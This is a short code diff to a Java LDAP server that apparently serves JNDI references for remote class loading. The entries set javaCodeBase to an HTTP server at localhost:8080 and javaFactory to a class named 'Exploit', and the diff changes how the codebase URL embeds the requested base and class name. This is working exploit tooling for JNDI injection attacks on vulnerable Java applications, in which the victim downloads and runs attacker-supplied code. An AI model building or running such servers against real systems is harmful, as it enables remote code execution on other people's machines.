@@ -28,7 +28,7 @@ public class Application {
     private static final int PORT = 12345;
 
     private static final String OBJECT_CLASS = "javaNamingReference";
-    private static final String JAVA_CODE_BASE = "http://localhost:8080/code/#Exploit";
+    private static final String JAVA_CODE_BASE = "http://localhost:8080/code";
     private static final String JAVA_FACTORY = "Exploit";
     private static final String JAVA_CLASS_NAME = "foo";
 
@@ -78,7 +78,7 @@ public class Application {
                     base, JAVA_CODE_BASE, JAVA_FACTORY, JAVA_CLASS_NAME);
 
             entry.addAttribute("javaClassName", JAVA_CLASS_NAME);
-            entry.addAttribute("javaCodeBase", JAVA_CODE_BASE + "?base=" + base);
+            entry.addAttribute("javaCodeBase", JAVA_CODE_BASE + "/" + base + "/#" + JAVA_CLASS_NAME);
             entry.addAttribute("objectClass", OBJECT_CLASS);
             entry.addAttribute("javaFactory", JAVA_FACTORY);
 
